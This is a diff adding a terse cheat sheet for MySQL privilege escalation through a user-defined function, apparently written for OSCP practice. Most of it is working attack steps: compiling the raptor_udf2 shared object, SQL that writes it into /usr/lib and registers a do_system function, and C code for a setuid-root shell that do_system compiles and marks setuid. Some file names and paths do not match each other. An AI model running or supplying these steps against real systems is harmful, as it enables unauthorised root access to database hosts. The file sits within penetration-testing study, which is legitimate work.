@@ -1,0 +1,63 @@
+
+
+mysql priv esc.
+
+multi part, this has been proven to work in OSCP.
+Check if the system can be abused with raptor.c which is available in many places online
+
+save it as raptor_udf2.c
+
+Compile as below
+
+gcc -g -c raptor_udf2.c
+
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+MYSQL COMMANDS
+
+mysql -u root -p PASSWORD
+
+use mysql;
+
+create table foo(line blob);
+
+insert into foo values(load_file('/home/USER_YOU_ARE_ON_SYSTEM_WITH/raptor_udf2.so'));
+
+select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+
+create function do_system returns integer soname 'raptor_udf2.so';
+
+select * from mysql.func;
+
+select do_system('id > /tmp/out; chown USER.GROUP /tmp/out');
+
+\! sh
+
+cat /tmp/out
+
+IF YOU CAN READ THE FILE, CONGRATULATIONS, THE SYSTEM CAN BE PWNED
+
+if not, then youre shit out of luck
+PT 2
+
+create setuid.c in your sh without exiting mysql
+
+int main()
+{
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
+    system("/bin/bash");
+    return 0;
+}
+
+hit exit, itll kill your sh and drop you back into mysql
+
+select do_system('gcc -o /tmp/suid /tmp/suid.c');
+
+select do_system('chmod u+s /tmp/suid');
+
+go to /tmp
+
+run /.suid
+
+r00t
